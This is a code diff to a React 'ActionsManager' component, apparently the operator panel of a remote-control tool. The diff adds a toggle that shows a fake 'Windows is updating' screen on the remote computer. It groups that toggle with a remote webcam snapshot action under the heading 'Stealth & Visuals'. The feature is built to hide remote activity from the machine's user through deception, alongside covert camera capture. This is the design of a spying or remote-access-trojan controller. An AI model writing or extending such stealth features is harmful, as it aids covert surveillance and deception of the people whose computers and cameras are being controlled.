@@ -27,6 +27,11 @@ export default function ActionsManager({ sendMessage, lastMessage }) {
   const [confirming, setConfirming] = useState(null)
   const [snapLoading, setSnapLoading] = useState(false)
   const [snapError, setSnapError] = useState(null)
+  const [privacyActive, setPrivacyActive] = useState(() => {
+    // Session-specific persistence for privacy mode
+    const sessionId = window.location.pathname.split('/').pop()
+    return localStorage.getItem(`sc_privacy_${sessionId}`) === 'true'
+  })
 
   // Clear loading state when response arrives
   useEffect(() => {
@@ -53,22 +58,41 @@ export default function ActionsManager({ sendMessage, lastMessage }) {
     sendMessage({ type: 'camera_snapshot_request' })
   }
 
+  const togglePrivacy = () => {
+    const newVal = !privacyActive
+    const sessionId = window.location.pathname.split('/').pop()
+    setPrivacyActive(newVal)
+    localStorage.setItem(`sc_privacy_${sessionId}`, newVal)
+    sendMessage({ type: 'privacy_screen', enabled: newVal })
+  }
+
   return (
     <div className="actions-manager fade-in">
-      {/* Camera Section */}
+      {/* Camera & Privacy Section */}
       <div className="actions-section">
-        <h3 className="section-title">📸 Camera Control</h3>
-        <div className="camera-grid">
+        <h3 className="section-title">🕵️ Stealth & Visuals</h3>
+        <div className="actions-grid">
           <div className="action-card camera-card" onClick={takeSnapshot}>
             <div className="action-icon">📸</div>
             <div className="action-info">
               <h4>Take Snapshot</h4>
-              <p>Capture high-res frame from remote webcam</p>
+              <p>Capture frame from remote webcam</p>
             </div>
             {snapLoading && <div className="loader-small" />}
           </div>
-          {snapError && <div className="action-error">⚠️ {snapError}</div>}
+
+          <div 
+            className={`action-card privacy-card ${privacyActive ? 'active-privacy' : ''}`} 
+            onClick={togglePrivacy}
+          >
+            <div className="action-icon">{privacyActive ? '🔓' : '🔒'}</div>
+            <div className="action-info">
+              <h4>{privacyActive ? 'Disable Privacy Screen' : 'Enable Privacy Screen'}</h4>
+              <p>{privacyActive ? 'End the fake Windows Update' : 'Show fake "Windows is updating" screen'}</p>
+            </div>
+          </div>
         </div>
+        {snapError && <div className="action-error">⚠️ {snapError}</div>}
       </div>
 
       {/* System Power & State */}
